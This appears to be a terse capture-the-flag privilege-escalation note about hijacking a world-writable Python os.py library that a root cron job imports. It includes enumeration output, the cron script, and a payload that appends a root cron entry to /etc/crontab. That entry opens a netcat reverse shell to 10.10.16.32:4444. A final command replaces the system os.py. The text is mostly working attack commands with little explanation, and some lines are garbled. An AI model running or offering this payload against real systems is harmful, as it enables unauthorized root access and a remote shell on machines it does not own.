# Python library hijack

Output [Linenum](linenum.md)

Library os.py writeable

```sh
[-] Files not owned by user but writable by group:
- rwxrw-rw- 1 nobody nogroup 45639 May 11 09:45 /etc/Development/LinEnum. sh
-rwxrw-rw- 1 nobody nogroup 935452 May 11 09:38 /etc/Development/pspy64s
-rwxrw-rw- 1 nobody nogroup 5493 May 11 09:32 /etc/Development/php-reverse-shell.php rwxrw-rw- 1 nobody nogroup 4 May 11 08:49 /etc/Development/tmp. txt
-rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.py
```

[Pyps](pyps.md) output

```sh
UID=0    PID=27009    /usr/bin/python /opt/serveradmin/reporter-py
UID=0    PID=27008    /bin/sh -c /opt/server_admin/reporter-py
UID=0    PID=27007    /usr/sbin/CRON
```

```python
#!/usr/bin/python
import​ os

to_address = ​"admin1@friendzone.com"
from_address = ​"admin2@friendzone.com"

print​ ​"[+] Trying to send email to %s"​%to_address

#command = ''' mailsend -to admin2@friendzone.com -from
admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub
scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)
# I need to edit the script later
# Sam ~ python developer
```

```sh
shell = ​'''
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.32 4444 >/tmp/f
'''
f = open(​'/etc/crontab'​, ​'a'​) f.write(shell)
f.close()
```

```
 cp /etc/Development/os.py /usr/lib/python2.7/os.py
```
